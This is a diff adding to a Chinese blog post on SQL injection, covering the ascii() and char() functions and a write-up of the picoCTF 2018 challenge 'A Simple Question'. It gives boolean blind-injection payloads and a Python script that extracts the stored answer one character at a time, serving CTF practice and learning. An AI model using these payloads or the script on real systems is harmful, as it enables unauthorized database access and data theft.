@@ -337,7 +337,84 @@
     | Dummy00000          |
     +---------------------+
     与rpad()相对应的是左填充函数lpad()。
+
+(10)ascii()
+    语法:ascii(character) 返回字符的ascii码
+
+(11)char()
+    语法:char(num) 反汇ascii码对应的字符
 </code></pre>
+
+<p>例题：<a href="http://2018shell1.picoctf.com:36052/">http://2018shell1.picoctf.com:36052/</a></p>
+
+<pre><code>    这是picoCTF2018中一道web题，题目名称&quot;A Simple Question&quot;，较为简单，可以通过布尔盲注的方法拿到flag
+    打开链接，看到一个简单提问，随便回答一下
+</code></pre>
+
+<p><img src="/post/images/sqlInjection1.JPG" alt="image1" />
+<img src="/post/images/sqlInjection2.JPG" alt="image1" /></p>
+
+<pre><code>    直接返回了查询语句，尝试answer = admin' or '1
+</code></pre>
+
+<p><img src="/post/images/sqlInjection3.JPG" alt="image1" />
+<img src="/post/images/sqlInjection4.JPG" alt="image1" /></p>
+
+<pre><code>    so close? 虽然有了不同回显，但还不能据此判断注入测试成功与否，毕竟有可能是被过滤检测了。
+    检查一下网页源码，在第20行有提示
+</code></pre>
+
+<p><img src="/post/images/sqlInjection5.JPG" alt="image1" /></p>
+
+<pre><code>    遂得如下源码
+</code></pre>
+
+<p><img src="/post/images/sqlInjection6.JPG" alt="image1" /></p>
+
+<pre><code>    (通过源码可知，这题其实是SQLite数据库，虽然与MYSQL不同，但接下来注入中使用的函数在两种数据库中是相通的)
+
+    在第22行可以看出，回显“you are so close”确实是注入成功的结果。接下来根据两种不同的回显就可以进行盲
+    注了。
+    由于已经知道表名answers和字段名answer，可直接构造
+    payload1: answer = admin' or length((select group_concat(answer) from answers))&gt;1 or '0 
+    使用二分法可快速确定 length((select group_concat(answer) from answers))=14,然后就是确定具体内容
+    payload2: answer = admin' or substr((select group_concat(answer) from answers), 1, 1)&gt;char(44) or '0
+    依次增加substr()函数开始截取的位置，每次截取一个字符和char(num)进行大小比较以确定该字符的具体值，脚本如下：
+</code></pre>
+
+<p><br></p>
+
+<pre><code>    # python3
+    # picoCTF2018 A Simple Question
+    import requests
+
+    if __name__ == '__main__':
+        url = 'http://2018shell1.picoctf.com:36052/answer2.php'
+        # answer = &quot;admin' or length((select group_concat(answer) from answers))=14 or '0&quot;
+        for i in range(14):
+            for num in range(44, 123):
+                # 遍历ASCII码值为44~122的字符，依次与当前截取到的字符判等，来确定当前字符。
+                answer = &quot;admin' or substr((select group_concat(answer) from answers),&quot;+str(i+1)+&quot;,1)=char(&quot;+str(num)+&quot;) or '0&quot;
+                data = {
+                    'answer': answer
+                }
+                html = requests.post(url, data=data)
+                if html.text[-22:-6]=='You are so close':  
+                    print(chr(num), end='')
+                    break
+</code></pre>
+
+<p><br></p>
+
+<pre><code>    得到结果：
+</code></pre>
+
+<p><img src="/post/images/sqlInjection7.JPG" alt="image1" /></p>
+
+<pre><code>    也即answer=41AndSixSixths，提交即可得到flag。
+</code></pre>
+
+<p><img src="/post/images/sqlInjection8.JPG" alt="image1" /></p>
 
 <p>Loading……</p>
               
